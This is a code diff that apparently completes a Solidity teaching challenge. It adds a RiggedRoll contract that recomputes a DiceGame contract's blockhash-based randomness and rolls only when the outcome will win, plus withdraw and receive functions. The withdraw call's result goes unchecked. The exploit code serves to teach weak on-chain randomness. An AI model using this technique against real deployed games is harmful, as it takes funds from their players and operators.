@@ -5,20 +5,34 @@ import "hardhat/console.sol";
 import "./DiceGame.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
-contract RiggedRoll is Ownable {
+error RiggedRoll__NotEnoughBalance();
 
+contract RiggedRoll is Ownable {
     DiceGame public diceGame;
 
     constructor(address payable diceGameAddress) {
         diceGame = DiceGame(diceGameAddress);
     }
 
-    //Add withdraw function to transfer ether from the rigged contract to an address
+    receive() external payable {}
 
+    function withdraw() public onlyOwner {
+        payable(msg.sender).call{value: address(this).balance}("");
+    }
 
-    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
-
-
-    //Add receive() function so contract can receive Eth
-    
+    function riggedRoll() public {
+        if (address(this).balance < .002 ether) {
+            revert RiggedRoll__NotEnoughBalance();
+        }
+        uint256 nonce = diceGame.nonce();
+        bytes32 prevHash = blockhash(block.number - 1);
+        bytes32 hash = keccak256(
+            abi.encodePacked(prevHash, address(diceGame), nonce)
+        );
+        uint256 roll = uint256(hash) % 16;
+        console.log("ROLL PREDICTED: ", roll);
+        if (roll <= 2) {
+            diceGame.rollTheDice{value: 0.002 ether}();
+        }
+    }
 }
